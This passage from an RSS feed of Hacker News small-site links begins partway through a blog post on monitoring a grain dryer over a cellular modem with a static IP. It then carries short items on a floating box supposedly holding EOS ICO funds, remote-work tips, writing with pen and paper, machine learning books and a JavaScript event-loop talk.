<p>In our specific case, we needed to use the following settings to be able to get the static IP assigned to the modem:</p>

<ul>
  <li>Access point name (APN): <code>staticipeast.telus.com</code> (we’re on the east coast)</li>
  <li>Authentication: None</li>
  <li>Packet data profile (PDP): IPv4</li>
</ul>

<div>
<p><img alt="Configuring the APN to use the static IP assigned to the account." src="https://d33wubrfki0l68.cloudfront.net/a9161e0b08165d260829bf6fd22337043b63bffa/40217/assets/dryer/apn-settings.png">
</p>
<p>
  In the modem settings, we need to configure a new APN to ask the cellular carrier to assign the account's static IP to the modem.
</p>
</div>

<p>The LB1120 has a setting to automatically connect to the Internet upon booting: I recommend turning this on to have it connect automatically in the case of a power failure.</p>

<p>Let’s reboot the modem one more time. At this point, the modem should be using the static IP assigned to your data plan by the cellular carrier.</p>

<div>
<p><img alt="Signal is equivalent to 2 bars out of 5." src="https://d33wubrfki0l68.cloudfront.net/5c248b8917f0fe46445757c0dee3636422b25f1b/b2044/assets/dryer/2-bars.jpg">
</p>
<p>
  The Netgear LB1120 cellular modem, all set up and ready to go. Even though it sits at 2 bars out of 5, it's plenty for the low throughput use case of reading data from a dryer.
</p>
</div>

<p>A tip to know if the modem is configured correctly: with the computer (device A) connected to the modem via Ethernet, use another device (device B) to access the expected static IP address (I used my smartphone). On device A, serve something (anything) on port 80 (I did <code>sudo python -m SimpleHTTPServer 80</code>), and see if you get that on device B when visiting the static IP address. If you do, then the modem is all set up and ready to go. If not, something’s wrong (invalid APN, incorrect data plan, no public static IP configured by the cellular carrier, some sort of NAT that prevents direct access, etc.).</p>

<p>Now that the modem is configured properly, let’s move on to configuring the grain dryer itself.</p>

<h3 id="configuring-the-dryer">Configuring the dryer</h3>

<p>The process to configure the dryer is fairly similar to configuring the modem: we essentially connect the dryer to the laptop via Ethernet to configure it via a web interface. But first, let’s look inside the dryer’s computer compartment.</p>

<p>It all peels up like an onion: the outermost layer is the protective door to prevent water and debris from hitting switches and the touchscreen, and the middle layer is the computer and touchscreen itself along with a PLC. The Watchdog module is fixed inside the box itself.</p>

<div>
<p><img alt="The dryer's computer and PLC internals exposed." src="https://d33wubrfki0l68.cloudfront.net/a74f45dc1610d35fecb4981dae16685049b56b5c/11a3d/assets/dryer/onion.jpg">
</p>
<p>
  The dryer's PLC. The Watchdog module is not pictured (it's fixed on the right).
</p>
</div>

<p>When looking inside the box, the Watchdog module is fixed inside and connected to the rest of the PLC via an RS232 serial port. There are two Ethernet ports: one WAN port (the one on the left in the picture), and a LAN port (the one on the right).</p>

<div>
<p><img alt="The Watchdog module fixed inside the computer compartment of the dryer." src="https://d33wubrfki0l68.cloudfront.net/e3234c6b71810bcce6c0ab3b7e561fee69d4a57e/1e608/assets/dryer/watchdog-module.jpg">
</p>
<p>
  The Watchdog module. The WAN port is directly connected to the modem.
</p>
</div>

<p>To configure the dryer’s network settings, we need to connect the Watchdog’s LAN port to the computer via Ethernet and access the web interface at <code>http://10.0.0.1/setup</code>. On this screen, you’ll need to click “Configure”, which will bring up the possibility to use DHCP or a static IP address. In our case, we select the “static IP” option.</p>

<div>
<p><img alt="The Watchdog network configuration screen, to configure the static IP address used to connect to the dryer." src="https://d33wubrfki0l68.cloudfront.net/2ceb582c1539a2d312fde85322f070fa42c21e38/ea792/assets/dryer/network-setup.png">
</p>
<p>
  Configuring the network settings on the grain dryer.
</p>
</div>

<p>On the next screen, we fill out the following fields:</p>

<ul>
  <li>Static IP address</li>
  <li>Subnet mask</li>
  <li>Gateway</li>
  <li>DNS1</li>
  <li>DNS2</li>
</ul>

<p>Assuming that the static IP address provided by the cellular carrier is <code>241.2.31.59</code>, we’d fill out the fields as such:</p>

<ul>
  <li>Static IP address: <code>241.2.31.59</code> (static IP from the cellular carrier)</li>
  <li>Subnet mask: <code>255.255.255.0</code> (pretty standard stuff)</li>
  <li>Gateway: <code>241.2.31.1</code> (same as static IP, but last component is <code>1</code>)</li>
  <li>DNS1: <code>241.2.31.1</code> (we use the gateway as the DNS provider)</li>
  <li>DNS2: <code>8.8.8.8</code> (this is Google DNS, because why not)</li>
</ul>

<p>Once that’s done, save the network configuration, and turn off the grain dryer.</p>

<p>You may now connect the modem to the Watchdog module’s WAN port (as pictured a few paragraphs above).</p>

<p>Now, the moment of truth: turn on the dryer. You may …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://maximevaillancourt.com/blog/monitoring-a-grain-dryer-via-the-internet">https://maximevaillancourt.com/blog/monitoring-a-grain-dryer-via-the-internet</a></em></p>]]>
            </description>
            <link>https://maximevaillancourt.com/blog/monitoring-a-grain-dryer-via-the-internet</link>
            <guid isPermaLink="false">hacker-news-small-sites-25031661</guid>
            <pubDate>Mon, 09 Nov 2020 05:12:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[4 Billion USD ICO From 2017: Clues Emerging, Finally]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25031582">thread link</a>) | @npguy
<br/>
November 8, 2020 | https://doublespend.io/2020/10/28/breaking-object-floating-in-atlantic-could-be-carrying-funds-raised-in-eos-ico/ | <a href="https://web.archive.org/web/*/https://doublespend.io/2020/10/28/breaking-object-floating-in-atlantic-could-be-carrying-funds-raised-in-eos-ico/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>Travelers aboard a luxury TransAtlantic cruise have shared pictures that many in the crypto community believe could provide clues on the missing 4 billion dollars raised during the EOS ICO. </p>



<p>DoubleSpend’s own analysis based on the size of the box show that it could very well contain the amount in USDs that was raised in the year-long ICO.</p>
<div><p><a href="https://twitter.com/share?url=https://doublespend.io/2020/10/28/breaking-object-floating-in-atlantic-could-be-carrying-funds-raised-in-eos-ico/&amp;text=Object%20Floating%20In%20Atlantic%20Ocean%20Could%20Contain%20EOS%E2%80%99%20ICO%20Funds%3A%20Sources" title="Share on Twitter" target="_blank" rel="nofollow noopener noreferrer" data-postid="409" data-social-network="Twitter" data-social-action="Tweet" data-social-target="https://doublespend.io/2020/10/28/breaking-object-floating-in-atlantic-could-be-carrying-funds-raised-in-eos-ico/"><span><span><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="29.71875" height="32" viewBox="0 0 951 1024"><path d="M925.714 233.143q-38.286 56-92.571 95.429 0.571 8 0.571 24 0 74.286-21.714 148.286t-66 142-105.429 120.286-147.429 83.429-184.571 31.143q-154.857 0-283.429-82.857 20 2.286 44.571 2.286 128.571 0 229.143-78.857-60-1.143-107.429-36.857t-65.143-91.143q18.857 2.857 34.857 2.857 24.571 0 48.571-6.286-64-13.143-106-63.714t-42-117.429v-2.286q38.857 21.714 83.429 23.429-37.714-25.143-60-65.714t-22.286-88q0-50.286 25.143-93.143 69.143 85.143 168.286 136.286t212.286 56.857q-4.571-21.714-4.571-42.286 0-76.571 54-130.571t130.571-54q80 0 134.857 58.286 62.286-12 117.143-44.571-21.143 65.714-81.143 101.714 53.143-5.714 106.286-28.571z"></path></svg></span><span>Tweet</span></span><span>0</span></a></p></div>		</div></div>]]>
            </description>
            <link>https://doublespend.io/2020/10/28/breaking-object-floating-in-atlantic-could-be-carrying-funds-raised-in-eos-ico/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25031582</guid>
            <pubDate>Mon, 09 Nov 2020 04:55:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Strategies to working remotely and smashing goals]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25031490">thread link</a>) | @veebuv
<br/>
November 8, 2020 | https://www.remoteworkly.co/blog/22-tips-to-working-remotely-and-smash-your-goals | <a href="https://web.archive.org/web/*/https://www.remoteworkly.co/blog/22-tips-to-working-remotely-and-smash-your-goals">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-w-id="45d72c63-4641-3f9f-f271-8df897413c12"><p>Alright the future of work is here to stay and we all need to prepare for the best remote work practices. Regardless of what happens, work has changed forever, people will go back to the office surely, but the dynamic will now be a hybrid mode.<br>‍</p><p>So learning how to work remotely will be a skill in your arsenal that might just propel you to your next career promotion. If you've asked yourself the question "how to work from home" - you've reached the right place.<br>‍</p><h4>1) Create a routine</h4><p>If you want to succeed working from home or working remotely this is a must, which is why it's the top position. You need to build a system that builds a body clock. I used to get into the zone when I got onto the train and grabbed by morning coffee at my office, when I couldn't do this anymore I spiraled. This was until I started building an atomic habit again, micro habits that signal the mind for whats about to happen next. Nowadays my trigger is early morning juice, similarly so, build a routine. Get out of bed, go to the gym, have a process.<br>‍</p><h4>2) Have your creative work space</h4><p>Separate your living, from your office space. Even if it means working from a coffee shop. You need to keep your area of comfort for leisure and work for work. This is an important work tip as separation of concerns as well as "environments" make a significant difference to motivation. Pretty much the same reason people go to libraries when they can read at home</p><p>‍</p><h4>3) Set time boundaries</h4><p>Its very easy to be sucked into 24 hour work when working from home. One of the keys to working remotely is creating time boundaries. Employers may feel like you're available to message after work hours. In addition you might get FOMO from all the slack notifications. Fight the urge, set your boundaries. 80% of 130 people I spoke to said they were constantly fatigued from working from home. This is a very important tip amongst other work from home tips and tricks. Stay disciplined to time<br>‍</p><h4>4) Leave home</h4><p>How to be productive working from home ? Leave your home. Ironic - I know but cabin fever can creep into you. As humans we need social interaction and movement. Step away from your home, go for a walk, meet a friend or better yet exercise. This will stimulate both your body muscles as well as your brain. Feeling fresh air graze your face makes a big difference, especially when you're glued to your screen<br>‍</p><h4>5) Plan meetings with work colleagues</h4><p>We've been remote for nearly 1.5 years now and I always advice social meetings for working remotely. Catch up with any team-mate in the same city as you and make it a monthly if not weekly thing. Building bonds with people in real life not only helps you create long lasting relationships, but also helps you connect deeper with another person. 70% of communication is non - verbal, which you miss out over zoom calls.<br>‍</p><h4>6) Reduce distractions</h4><p>"Minimise the number of distractions you have in your office" - simple yet sage advice for working remotely. We've got a concentration span of 12 seconds, with slack messages going off every moment combined with our innate nature of not wanting to miss out on important conversations leads us to doing absolutely no work at all. I encourage you to embrace an async first work culture, tools like <a href="http://remoteworkly.co/">remoteworkly.co</a> help with async video meetings or even loom for screen recording.<br>‍</p><h4>7) Have no meeting Wednesdays</h4><p>Meets really hurt productivity. 72% of managers say meetings are a complete waste and 60% of employees think they will work better without meetings. This is the same reason Zoom fatigue is becoming a big issue, because you need to have your camera on and focus the entire time. Try encourage a culture where you have certain days with no meetings. Any conversation that needs to happen can occur in an asynchronous way, weather thats via tools like <a href="http://remoteworkly.co/">remoteworkly.co</a> or vidyard. If you're reporting bugs, use feedback tools like bugheard or <a href="http://remoteworkly.co/show">remoteworkly.co/show</a></p><h4><br>8)Avoid unwanted meetings with conversation bloat</h4><p>Focus on getting work done, try set a decorum where you can leave meetings you're not needed in anymore. Teams that embrace the concept of async communication will win. This will reduce anxiety within teams, improve culture and make sure the meetings that do happen are purely focused on value and outcome. This can be done using tools like <a href="http://remoteworkly.co/">remoteworkly.co</a> for async meetings and startups or even voice notes like recordify</p><h4><br>9)Start with the toughest task</h4><p>There's a science behind this but it works. We often think starting with easy tasks gives us the feeling of accomplishment and builds up momentum. There is some truth to this, however by the time you reach the tough/long task to complete you're left drained of energy and delay it to tomorrow, which never comes. Start with the toughest tasks, its the best way to be productive working from home<br>‍</p><h4>10)Over communicate</h4><p>There will be obvious disconnect between you and your team mates when you're remote. That is the nature of VoIP communication. So make sure you overcommunicate. This does not mean to spam people with 100 messages, but rather use video and tools that capture as much data as possible for you to make it easier for the other person to understand what you're doing without having to reach back to you."</p><h4><br>11)Leverage asynchronous communication</h4><p>My favorite tip in my list of remote work best practices. I strongly believe async communication is the way of the future. Leverage using async communication whenever and wherever possible without organizing impromptu/time blocking calls. There's several tools out there that let you take full advantage of async communication, <a href="http://remoteworkly.co/">remoteworkly</a>, <a href="http://loom.com/">loom</a>, <a href="http://vidyard.com/">vidyard</a>, <a href="http://marker.io/">marker</a> (for website feedback), <a href="http://remoteworkly.co/show">remoteworkly</a> (for QA feedback), <a href="http://trello.com/">trello</a>, <a href="http://asana.com/">asana<br>‍</a></p><h4>12)Use productivity hacks like pomodoro</h4><p>The pomodoro technique is one of the best productivity tips I came across. Its an old technique that lets you cut down your work into an investment reward balance. This builds another atomic habit loop where you learn to enjoy difficult tasks in anticipation of the reward. Your day is broken down into 25 minute work chunks of pure focus with 5 minute breaks, do this 4 times and then take a 20 minute break, rinse and repeat. Checkout timechi.com</p><h4><br>13)Share your project progress</h4><p>The easiest way to start working when you're feeling down or demotivated is by sharing your progress. Social accountability plays a big role in human motivation, something about putting our reputation at risk that kicks us in the behind. In addition, sharing your progress becomes a incredible feedback cycle, where you encourage others with your progress or cause them to reach out to you and motivate you to push faster. Lastly, having progress updates is a great way to look back and see how far you come, consequentially motivating you to work better</p><h4><br>14)Avoid jumping on impromptu phonecalls</h4><p>This rolls back to my earlier point about async conversations, Paul Graham mentioned that one of the downfalls of remote work is impromptu meetings where a large number of incredible ideas are usually generated is being robbed from todays workforce. Yes this is true, but on the flip side, most of the inefficiencies in working from an office came from these "tap on the shoulder" interruptions. I no longer pick up calls unless the message following up says "this is urgent", your concentration is sacred in 2020. Protect it at all costs.</p><h4><br>15)Set clear expectations for each day</h4><p>Employing a daily manifest of long term goals, short term goals, micro tasks as well as schedule has been a game changer in working remote. You almost get to "grade" each day in terms of the success you wanted to achieve and what you did achieve. This lets you work out what is the most effective work from home schedule for you. Each week, analyze the good days and bad days, pick up patterns that lead to bad days and those that lead to good days and optimize to focus on the good patterns.</p><h4><br>16Share with video whenever you can</h4><p>To prevent the feeling of isolation, use video software whenever you can. <a href="http://loom.com/">Loom</a> is a great place to begin, or even zoom for work meetings. I know it can be daunting at times, but it provides a great path to building deeper and more meaningful relationships with teams. PS - when you're chatting, look into the camera and not your screen. Makes double the impact</p><h4><br>17) Ask for one on one checkins</h4><p>Do NOT cancel your one on ones with your team mates, they're more important than every given there is no face to face relationship with your direct supervisor or subordinate. Use a template with a clear structure to find out how your team is doing, how things can be done better. This builds trust and encourages them to keep motivated even when people feel disconnected.<br>‍</p><h4>18) Bond with your team beyond work, get to learn about their family</h4><p>Use tools like <a href="http://donut.com/">donut</a> to encourage your team members to learn about each other. This is vital for new employees who don't have a chance to meet new people given you're restricted to a computer, donut runs introduction meetings between people. Encouraging that communication between new colleagues is a great way to improve team bond, morale and company culture</p><h4><br>19) Exercise</h4><p>Yes, do it. As human's we're not made to be seat potatoes. Despite how tasty potatoes are, you can't aspire to be one. Get out, hit the gym and exercise. The endorphins release as well as adrenaline rush you get post exercise is fundamental for peak performance. You won't find one successful person who doesn't preach for a daily exercise schedule</p><h4><br>20) Use noise filtering software</h4><p>Working at home with kids or even a dog can be very disturbing and sometimes embarrassing. Even though everyone is working remote, the noise of a grinder in the background whilst you're delivering your Q4 results can be quite distractive. Use tools like <a href="http://krisp.ai/">krisp</a> that magically cut out background noise and give you the confidence that regardless of who's speaking at the back, your colleagues won't be able to hear it.<br>‍</p><h4>21) Check in with 5 of your friends</h4><p>I assure you many of your friends will be …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.remoteworkly.co/blog/22-tips-to-working-remotely-and-smash-your-goals">https://www.remoteworkly.co/blog/22-tips-to-working-remotely-and-smash-your-goals</a></em></p>]]>
            </description>
            <link>https://www.remoteworkly.co/blog/22-tips-to-working-remotely-and-smash-your-goals</link>
            <guid isPermaLink="false">hacker-news-small-sites-25031490</guid>
            <pubDate>Mon, 09 Nov 2020 04:34:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Start with pen and paper]]>
            </title>
            <description>
<![CDATA[
Score 72 | Comments 32 (<a href="https://news.ycombinator.com/item?id=25031483">thread link</a>) | @sethetter
<br/>
November 8, 2020 | https://sethetter.com/posts/start-with-pen-and-paper/ | <a href="https://web.archive.org/web/*/https://sethetter.com/posts/start-with-pen-and-paper/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
            


<article>
    
    <section>
        <p>tl;dr — If you feel unfocused, grab a pen and paper and start writing your thoughts down.</p>
<p>Is there a question you are stuck on? A ambiguous goal you're trying to accomplish? Maybe a task you know you need to do but from which you keep getting distracted?</p>
<p><strong>Nothing will provide focus like pen and paper.</strong></p>
<p>It's all too easy these days to have a clear intention only to be sidetracked by the whirlpool of apps and services clawing for our attention on our devices.</p>
<p>It helps to take the time to groom our notification settings for importance and timeliness, but a digital device that we can use to complete nearly any task will never stand up to pen and paper in terms of it's ability to provide focus.</p>
<p>My thoughts are a constant whirlwind, I'm certainly more distractible than most, and interacting with nearly any online service only fuels that fire. So how can I get anything done if I'm unable to control my focus?</p>
<p><strong>Pen and paper.</strong> Whenever I catch myself stuck in the whirlpool, feeling not-great because I <em>know</em> I'm not doing what I want to be doing, or what I should be doing, I step away, grab pen and paper, and start writing.</p>
<p>The simple act of writing can focus my thoughts and attention in a way that nothing else can. Free from distractions, just a canvas to pour my thoughts into, and turn them into something with a sense of direction and purpose.</p>
<p>Writing is like a superpower to me. If there's any task I want to accomplish, the first step is always to write it down. Anytime I need to recenter myself on that task, I simply return to paper.</p>
<p>Throughout my life I've found that the simplest solutions are often the most powerful. So far I've found no simpler solution to start tackling any problem than to simply write it down, and then keep on writing.</p>

    </section>
</article>


        </div></div>]]>
            </description>
            <link>https://sethetter.com/posts/start-with-pen-and-paper/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25031483</guid>
            <pubDate>Mon, 09 Nov 2020 04:33:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cool Machine Learning Books]]>
            </title>
            <description>
<![CDATA[
Score 101 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25031455">thread link</a>) | @ridddle
<br/>
November 8, 2020 | http://matpalm.com/blog/cool_machine_learning_books/ | <a href="https://web.archive.org/web/*/http://matpalm.com/blog/cool_machine_learning_books/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
  <p>awhile ago i posted
   <a href="http://matpalm.com/blog/2010/08/06/my-list-of-cool-machine-learning-books/">my list of cool machine learning books</a>,
   but it's been awhile so it's probably time to update it...
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/mml.jpg"></p>
<p><b><a href="https://mml-book.github.io/">Mathematics for Machine Learning</a>
   by Marc Peter Deisenroth, A. Aldo Faisal &amp; Cheng Soon Ong.</b>
</p>
<p>this is my personal favorite book on the general math required for machine learning,
   the way things are described really resonate with me.
   available as a free pdf but i got a paper copy to support the authors after reading the
   first half.
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/laalfd.jpg"></p>
<p><b><a href="http://math.mit.edu/~gs/learningfromdata/">Linear Algebra and Learning from Data</a>
   by Gilbert Strang.</b>
</p>
<p>this is gilbert's most recent work. it's really great, he's such a good teacher, and
   <a href="https://ocw.mit.edu/courses/mathematics/18-065-matrix-methods-in-data-analysis-signal-processing-and-machine-learning-spring-2018/">his freely available lectures</a>
   are even better. it's a shorter text than his other classic intro below with
   more of a focus on how things are connected to modern machine learning techniques.
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/itla.jpg"></p>
<p><b><a href="https://math.mit.edu/~gs/linearalgebra/">Introduction to Linear Algebra</a>
   by Gilbert Strang.</b>
</p>
<p>this was my favorite linear algebra book for a long time before his 'learning from
   data' came out. this is a larger book with a more comprehensive view of linear algebra.
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/ts.jpg"></p>
<p><b><a href="https://greenteapress.com/wp/think-stats-2e/">Think Stats: Probability and Statistics for Programmers</a> by Allen Downey.</b>
</p>
<p>this book focuses on practical computation methods for probability and statistics.
   i got a lot out of working through this one.
   it's all in python and available for free.
   ( exciting update! as part of writing this post i've discovered there's a new edition
   to read!)
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/dbda.jpg"></p>
<p><b><a href="https://sites.google.com/site/doingbayesiandataanalysis/">Doing Bayesian Data Analysis</a>
   by John Kruscgke</b>
</p>
<p>on the bayesian side of things this is the book i've most enjoyed working through.
   i've only got the first edition which was R and
   <a href="https://en.wikipedia.org/wiki/OpenBUGS">BUGS</a> but i see
   the second edition is R,
   <a href="http://mcmc-jags.sourceforge.net/">JAGS</a> and
   <a href="https://mc-stan.org/">Stan</a>.
   it'd be fun i'm sure to work through it doing
   everything in <a href="https://github.com/pyro-ppl/numpyro">numpyro</a>. i might do that in all
   my free time. haha. "free time" hahaha. sob.
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/eosl.jpg"></p>
<p><b><a href="https://web.stanford.edu/~hastie/ElemStatLearn/">The Elements of Statistical Learning</a>
   by Hastie, Tibshirani and Friedman</b>
</p>
<p>this is still one of the most amazing fundamental machine learning books i've ever had.
   in fact i've purchased this book <em>twice</em> and given it away both times :/ i might buy another
   copy some time soon, even though it's been freely available to download for ages. an
   amazing piece of work.
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/pgm.jpg"></p>
<p><b>
   <a href="https://mitpress.mit.edu/books/probabilistic-graphical-models">Probabilistic Graphical Models</a>
   by Daphne Koller &amp; Nir Friedman</b>
</p>
<p>this is an epic textbook that i'd love to understand better. i've read a couple of sections in
   detail but not the entire tome yet.
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/praml.jpg"></p>
<p><b>
   <a href="https://www.microsoft.com/en-us/research/people/cmbishop/prml-book/">Pattern Recognition and Machine Learning</a>
   by Christopher Bishop</b>
</p>
<p>this is probably the best overall machine learning text book i've ever read. such a beautiful book
   and <a href="https://www.microsoft.com/en-us/research/uploads/prod/2006/01/Bishop-Pattern-Recognition-and-Machine-Learning-2006.pdf">the pdf is FREE FOR DOWNLOAD!!!</a>
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/mlapp.jpg"></p>
<p><b><a href="https://mitpress.mit.edu/books/machine-learning-1">Machine Learning: A Probabilistic Perspective</a> by Kevin Murphy</b>
</p>
<p>this is my second favorite general theory text on machine learning.
   i got kevin to sign my copy when he was passing my desk once but
   someone borrowed it and never gave it back :(
   so if you see a copy with my name on the spine let me know!
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/homl.jpg"></p>
<p><b><a href="https://www.oreilly.com/library/view/hands-on-machine-learning/9781492032632/">Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow</a> by Aurélien Géron</b>
</p>
<p>this is the book i point most people to when they are interested in getting up
   to speed with modern applied machine learning without too much concern for the
   theory. it's very up to date (as much as a book can be) with the latest libraries
   and, most importantly, provides a good overview of not just neural stuff but fundamental
   <a href="https://scikit-learn.org/stable/">scikit-learn</a> as well.
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/mle.jpg"></p>
<p><b><a href="http://www.mlebook.com/wiki/doku.php">Machine Learning Engineering</a> by Andriy Burkov</b>
</p>
<p>a great book focussing on the operations side of running a machine learning system. i'm a bit
   under half way through the free online version and very likely to buy a physical copy to finish
   it and support the author. great stuff and, in many ways, a more impactful book than any of
   the theory books here.
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/itdm.jpg"></p>
<p><b><a href="https://www-users.cs.umn.edu/~kumar001/dmbook/index.php">Introduction to Data Mining</a>
   by Pang-Ning Tan, Michael Steinbach &amp; Vipin Kumar</b>
</p>
<p>this is another one that was also on my list from ten years ago and though it's section
   on neural networks is a bit of chuckle these days there is still a bunch of really
   great fundamental stuff in this book. very practical and easy to digest. i also see there's
   a second edition now. i reckon this would compliment the "hands on" book above very well.
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/salp.jpg"></p>
<p><b><a href="https://web.stanford.edu/~jurafsky/slp3/">Speech and Language Processing</a>
   by Dan Jurafsky &amp; James Martin</b>
</p>
<p>still the best overview of NLP there is (IMHO). can't wait to read the 3rd edition which
   apparently will cover more modern stuff (e.g. transformers) but until then, for the
   love of god though, please don't be one of those "this entire book is
   irrelevant now! just fine tune BERT" people :/
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/no.jpg"></p>
<p><b><a href="https://link.springer.com/book/10.1007/978-0-387-40065-5">Numerical Optimization</a>
   by Jorge NocedalStephen J. Wright</b>
</p>
<p>this book is super hard core and maybe more an operations
   research book than machine learning. though i've not read it cover to cover the
   couple of bits i've worked through really taught me a lot. i'd love to understand
   the stuff in this text better; it's so so fundamental to machine learning (and more)
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/dl.jpg"></p>
<p><b><a href="https://www.deeplearningbook.org/">Deep Learning</a>
   by Ian Goodfellow</b>
</p>
<p>writing a book specifically on deep learning is very dangerous since things move so fast but
   if anyone can do it, ian can... i think ian's approach to explaining neural networks
   from the ground up is one of my favorites. i got the first edition hardback but it's free to
   download from the website.
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/pr.jpg"></p>
<p><b><a href="https://mitpress.mit.edu/books/probabilistic-robotics">Probabilistic Robotics</a>
   by Sebastian Thrun, Wolfram Burgard and Dieter Fox</b>
</p>
<p>when i first joined a robotics group i bought a stack of ML/robotics books and this
   was by far the best. it's good intro stuff, and maybe already dated in places given
   it's age (the 2006 edition i have) but i still got a bunch from it.
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/tml.jpg"></p>
<p><b><a href="https://www.oreilly.com/library/view/tinyml/9781492052036/">TinyML</a>
   by Pete Warden &amp; Daniel Situnayake</b>
</p>
<p>this was a super super fun book to tech review! neural networks on microcontrollers?!?
   yes please!
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/ec.jpg"></p>
<p><b><a href="https://www.wiley.com/en-us/Evolutionary+Computation%3A+Toward+a+New+Philosophy+of+Machine+Intelligence%2C+3rd+Edition-p-9780471669517">Evolutionary Computation</a> by David Fogel</b>
</p>
<p>this is still by favorite book on evolutionary algorithms; i've had this for a loooong
   time now. i still feel like evolutionary approaches are due for a big big comeback
   any time soon....
</p>
<hr>


<h2>in the mail...</h2>
<p>the good thing about writing a list is you get people telling you cool ones you've missed :)
</p>
<p>the top three i've chosen (that are in the mail) are...
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/ciis.jpg"></p>
<p><b><a href="http://bayes.cs.ucla.edu/PRIMER/">Causal Inference in Statistics</a> by
   Judea Pearl, Madelyn Glymour &amp; Nicholas P. Jewell</b>
</p>
<p>recommended by <a href="https://twitter.com/animesh_garg">animesh</a> who quite rightly points out
   the lack of causality in machine learning books in the books above.
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/itiala.jpg"></p>
<p><b><a href="https://www.cambridge.org/au/academic/subjects/computer-science/pattern-recognition-and-machine-learning/information-theory-inference-and-learning-algorithms?format=HB&amp;isbn=9780521642989">Information Theory, Inference and Learning Algorithms</a> by David MacKay</b>
</p>
<p>i've seen this book mentioned a number of times and was most recently recommended by
   my colleague <a href="https://twitter.com/danesherbs">dane</a> so it's time to get it.
</p>
<hr>
   <p><img src="http://matpalm.com/blog/imgs/2020/mlb/bmlpa.jpg"></p>
<p><b><a href="https://www.oreilly.com/library/view/building-machine-learning/9781492045106/">Building Machine Learning Powered Applications</a> by Emmanuel Ameisen</b>
</p>
<p>a number of people i worked with have enjoyed this. first recommended by another
   colleague <a href="https://twitter.com/davidcolls">dave</a>.
   looks to be on the practical side rather than the theory but that's ok some times :)
</p>

  </div></div>]]>
            </description>
            <link>http://matpalm.com/blog/cool_machine_learning_books/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25031455</guid>
            <pubDate>Mon, 09 Nov 2020 04:26:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How does the event loop work in JavaScript? [video]]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25031384">thread link</a>) | @krayonatan
<br/>
November 8, 2020 | https://yonatankra.com/how-does-the-event-loop-work/ | <a href="https://web.archive.org/web/*/https://yonatankra.com/how-does-the-event-loop-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="primary"><main id="main" role="main"><article id="post-599"><div><!-- .entry-meta --><div> <p><span><span>Estimated Reading Time: </span> <span>&lt; 1</span> <span>minute</span></span></p><figure><p><span><iframe width="640" height="360" data-src="https://www.youtube.com/embed/Nqx3rtv_dko?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en-US&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p><figcaption>The event loop and your code talk from WarsawJS</figcaption></figure><p>On august 2020 I spoke at <a rel="noreferrer noopener" href="https://warsawjs.com/" data-type="URL" data-id="https://warsawjs.com/" target="_blank">WarsawJS</a>, explaining about the event loop and how it works.  I hope you will enjoy this talk.</p><p>If you prefer to read – <a href="https://yonatankra.com/the-event-loop-and-your-code/" data-type="post" data-id="299">here’s the blog post this talk is based on</a>.</p><p id="jp-relatedposts"><h3><em>Related</em></h3></p></div><!-- .entry-content --><!-- .entry-footer --></div></article><!-- #post-## --><p><h3>Enjoyed the article?</h3><h4>Sign up to my newsletter to enjoy more content:</h4></p>  <nav role="navigation" aria-label="Posts"><h2>Post navigation</h2></nav><!-- #comments --></main><!-- #main --></div></div>]]>
            </description>
            <link>https://yonatankra.com/how-does-the-event-loop-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25031384</guid>
